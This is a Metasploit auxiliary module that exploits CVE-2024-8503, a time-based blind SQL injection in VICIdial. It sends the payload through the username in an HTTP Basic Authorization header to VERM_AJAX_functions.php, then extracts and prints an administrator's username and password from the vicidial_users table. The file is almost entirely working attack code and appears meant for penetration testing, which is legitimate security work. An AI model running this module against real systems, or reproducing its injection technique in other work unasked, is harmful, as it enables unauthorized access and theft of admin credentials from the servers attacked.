class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Vicidial SQL Injection Time-based Admin Credentials Enumeration',
        'Description' => %q{
          This module exploits a time-based SQL injection vulnerability in VICIdial, allowing attackers
          to dump admin credentials (usernames and passwords) via SQL injection.
        },
        'Author' => [
          'Valentin Lobstein', # Metasploit Module
          'Jaggar Henry of KoreLogic, Inc.' # Vulnerability Discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://korelogic.com/Resources/Advisories/KL-001-2024-011.txt'],
          ['CVE', '2024-8503']
        ],
        'DisclosureDate' => '2024-09-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Base path of the VICIdial instance', '/']),
        OptInt.new('SqliDelay', [true, 'Delay in seconds for SQL Injection sleep', 1])
      ]
    )
  end

  def run
    print_status('Checking if target is vulnerable...')

    setup_sqli
    return print_error('Target is not vulnerable.') unless @sqli.test_vulnerable

    print_good('Target is vulnerable to SQL injection.')

    admin_credentials = retrieve_admin_credentials
    return print_error('Failed to retrieve admin credentials.') unless admin_credentials

    print_good("Admin username: #{admin_credentials[:username]}")
    print_good("Admin password: #{admin_credentials[:password]}")
  end

  def retrieve_admin_credentials
    username_query = "SELECT user FROM vicidial_users WHERE user_level = 9 AND modify_same_user_level = '1' LIMIT 1"
    admin_username = @sqli.run_sql(username_query)
    return unless admin_username

    password_query = "SELECT pass FROM vicidial_users WHERE user = '#{admin_username}' LIMIT 1"
    admin_password = @sqli.run_sql(password_query)
    return unless admin_password

    { username: admin_username, password: admin_password }
  end

  def setup_sqli
    @sqli = create_sqli(
      dbms: MySQLi::TimeBasedBlind,
      opts: { hex_encode_strings: true }
    ) do |payload|
      random_username = Rex::Text.rand_text_alphanumeric(8)

      username = "#{random_username}', '', (#{payload}));# "
      credentials = "#{username}:password"
      credentials_base64 = Rex::Text.encode_base64(credentials)

      send_request_cgi({
        'uri' => normalize_uri(datastore['TARGETURI'], 'VERM', 'VERM_AJAX_functions.php'),
        'vars_get' => { 'function' => 'log_custom_report' },
        'headers' => {
          'Authorization' => "Basic #{credentials_base64}"
        }
      })
    end
  end
end
